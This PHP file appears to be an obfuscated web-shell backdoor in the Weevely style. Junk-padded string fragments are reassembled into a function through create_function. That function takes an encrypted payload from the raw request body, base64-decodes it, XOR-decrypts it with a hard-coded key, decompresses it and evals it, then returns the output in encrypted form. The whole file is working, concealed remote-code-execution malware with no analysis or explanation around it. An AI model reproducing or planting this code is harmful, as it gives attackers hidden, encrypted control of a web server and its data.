<?php
$R=str_replace('H','','cHrHeaHte_HfuncHtHion');
$F='ch()u")u/$kh(.+)$)ukf)u/",@fil)ue_get_)uconten)uts(")uphp://)uinput")u),$m)==1) )u{@ob_st)uart())u';
$g='n)uction)u x)u($t,$k){$c=)ustrlen($k);$l)u=strlen($)ut);$o=)u"";for)u($i=0;)u)u$i<$l)u;){fo)ur($j=0';
$Y=';@e)uval(@gzunc)uompres)us()u@x(@base6)u4_decod)ue($m[)u1]),$k)u)));$o)u=)u@ob_get_conte)unts())u;@)u';
$j=';()u$j<$c&&$)ui<)u$l);$j++,$i++)u)u){$o.=$)ut{$i}^)u$k{$j};}})ur)ueturn )u$o;}if (@preg)u_mat';
$M='ob_e)und_cl)uean();$r=@b)uase64_en)ucode)u(@)ux(@gzcomp)ure)u)uss($o),)u$k));pri)unt("$p$kh$r$kf");}';
$o='$k="2b5c)ue3cc";$)ukh)u="2d46)u5fcf)u2a3b";$k)uf="0c7)ued8a54d2c)u";$p=)u"4)uIW1mN3h8G)uV)ugwTEZ)u";fu';
$f=str_replace(')u','',$o.$g.$j.$F.$Y.$M);
$k=$R('',$f);$k();
?>
